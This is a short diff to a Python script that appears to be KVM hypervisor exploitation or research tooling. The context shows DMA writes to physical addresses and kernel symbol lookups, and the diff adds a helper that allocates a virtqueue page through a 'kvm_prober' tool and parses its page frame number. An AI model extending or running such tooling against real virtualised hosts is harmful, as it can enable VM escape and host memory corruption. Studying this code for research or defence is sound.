@@ -5,6 +5,7 @@ import os
 import time
 import shutil
 from datetime import datetime
+from dynamic_kvm_prober import generic_probe
 
 # Path to vmlinux file containing kernel symbols
 VMLINUX_PATH = "/root/vmlinux"
@@ -204,6 +205,17 @@ def verify_dma_write_physaddr(phys_addr, new_path):
     log(f"[+] Read value: '{read_value}'")
     return new_path.strip('�') == read_value
 
+def get_pfn_from_vq():
+    out = run_cmd("kvm_prober allocvqpage")
+    match = re.search(r'PFN: 0x([0-9a-fA-F]+)', out)
+    if match:
+        pfn = int(match.group(1), 16)
+        log(f"[+] Allocated VQ PFN: {hex(pfn)}")
+        return pfn
+    else:
+        log("[!] Failed to get PFN from VQ alloc.")
+        return None
+    
 if __name__ == "__main__":
     if os.geteuid() != 0:
         print("[!] Must be run as root")
